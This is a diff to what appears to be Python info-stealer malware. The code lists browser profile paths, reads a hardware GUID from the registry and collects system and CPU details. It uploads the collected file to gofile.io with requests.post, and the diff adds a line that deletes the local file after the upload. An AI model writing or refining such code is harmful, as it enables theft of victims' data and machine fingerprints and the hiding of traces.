@@ -77,7 +77,6 @@ PATHS = {
     "Yandex"            : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
 }
 computer = wmi.WMI()
-cpuInfo = get_cpu_info()
 
 class Clipboard:
     def __init__(self):
@@ -236,6 +235,11 @@ class Logger():
         path = r'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\IDConfigDB\Hardware Profiles\0001'
         hwid2 = str(reg.read_entry(path, 'HwProfileGuid')).split("'")[5]
         try:
+            cpuInfo = get_cpu_info()
+        except:
+            cpuInfo = "Unknown"
+            pass
+        try:
             info={}
             info['Platform']= system() + " " + release()
             info['Platform Version']=version()
@@ -257,6 +261,7 @@ class Logger():
             try:
                 pcInfoRaw = requests.post('https://store7.gofile.io/uploadFile', files={'file': ('pci.txt', open('pci.txt', 'rb')),}).text
                 pcInfoUploaded = f"[Raw]({pcInfoRaw[87:113]})"
+                os.remove("pci.txt")
             except:
                 pcInfoUploaded = "Raw: N/A"
                 pass
